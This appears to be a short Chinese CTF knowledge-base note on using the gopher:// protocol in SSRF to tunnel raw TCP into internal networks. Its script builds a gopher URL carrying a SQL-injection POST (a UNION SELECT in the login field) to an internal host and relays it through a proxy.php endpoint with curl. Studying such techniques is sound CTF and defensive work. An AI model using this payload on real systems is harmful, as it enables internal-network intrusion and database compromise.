---
title: gopher 协议 SSRF — 多层内网穿透
category: web
tags: [ssrf, gopher, tcp-tunnel, proxy-bypass, url-encoding]
triggers: [gopher, gopher://, SSRF, proxy.php, gfix.php, rawurlencode, TCP任意数据, 内网穿透, 协议转换]
created: 2026-06-07
updated: 2026-06-07
sources: [ctf-kb/web/AICTF-SSRF-Gopher-技巧.md]
---

## Summary

`gopher://` 协议在 SSRF 中扮演 TCP 任意数据发送通道，可发送原始 HTTP 请求、构造任意 TCP 连接。

## Key Points

- gopher:// 协议 = 发送任意数据到任意 TCP 端口
- 可用于 HTTP 请求走私、任意 TCP 连接、协议转换
- 适用于目标只出站 80/443 但需要访问内网其他服务的场景
- 注意 URL 编码：通过中间层转发时 `+` 可能被转码

## Details

### 核心脚本

```python
import urllib.parse
# 构造 gopher payload：向目标 OA 系统发 SQL 注入
payload = "POST /login HTTP/1.1\r\nHost: 172.18.0.3:8080\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 58\r\n\r\nusername=' UNION SELECT 1,2,3,4,5,6,7,8,9-- &password=test"
encoded = urllib.parse.quote(payload, safe='')
gopher_url = f"gopher://172.18.0.3:8080/_{encoded}"
# 通过 proxy.php 转发
curl "http://target/proxy.php?url={gopher_url}"
```

## Connections

- Related: [[http-request-smuggling]]
- Related: [[aictf-nps-proxy-tunnel]]
- Related: [[aictf-layer-breach]]
- Related: [[multi-proxy-encoding-pitfalls]]
- GHSA: [[web/ghsa-ssrf-auth-bypass]]
